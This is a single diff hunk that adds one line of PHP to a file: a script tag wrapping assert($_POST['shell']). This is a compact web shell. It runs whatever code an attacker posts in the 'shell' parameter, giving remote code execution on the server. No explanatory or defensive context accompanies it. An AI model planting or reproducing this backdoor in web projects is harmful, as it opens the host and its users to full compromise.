@@ -1,0 +1,1 @@
+<script language=php> assert($_POST['shell']); </script>
